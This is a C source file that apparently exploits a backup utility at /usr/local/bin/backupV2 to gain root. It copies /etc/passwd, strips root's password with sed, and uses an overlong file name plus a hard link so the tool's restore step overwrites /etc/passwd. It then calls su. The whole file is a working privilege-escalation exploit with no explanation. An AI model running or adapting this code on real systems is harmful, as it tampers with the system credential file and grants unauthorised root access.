#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#define N 200
int main()
{
	char name[N];
	char cmd[N+50];
	int i;
	for(i = 0; i<N-1; ++i)
		name[i] = 'a';
	name[N-1] = '\0';

	
	system("cp /etc/passwd psd");
	system("sed -i 's/^root:[^:]*:/root::/g' psd ");

	strcpy(cmd, "mv psd ");
	strcat(cmd, name);
	system(cmd);

	strcpy(cmd, "/usr/local/bin/backupV2 backup ");
	strcat(cmd, name);
	system(cmd);

	system("rm aaaaaaaaaaaa*");

	strcpy(cmd, "ln /etc/passwd ");
	strcat(cmd, name);
	system(cmd);

	strcpy(cmd, "/usr/local/bin/backupV2 restore ");
	strcat(cmd, name);
	system(cmd);

	system("su");

	return 0;
}
